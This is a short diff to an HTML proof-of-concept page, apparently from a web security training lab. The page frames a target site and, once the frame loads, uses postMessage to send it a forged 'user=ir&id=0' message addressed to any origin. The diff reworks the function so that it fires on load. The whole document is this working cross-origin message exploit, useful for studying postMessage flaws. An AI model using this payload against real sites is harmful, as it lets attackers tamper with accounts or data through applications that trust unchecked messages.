@@ -2,10 +2,13 @@
   <body>
     <iframe src="http://ptl-9485b2e0-7c0cace5.libcurl.so/"  onload="hack()" id="frame1"> </iframe>
     <script>
-    setTimeout( function hack()
+      function hack()
+      {
+    setTimeout( function ()
       {
 var wn = document.getElementById('frame1').contentWindow;
       wn.postMessage('user=ir&id=0',"*");},2000);
+      }
       </script>
       </body>
     </html>
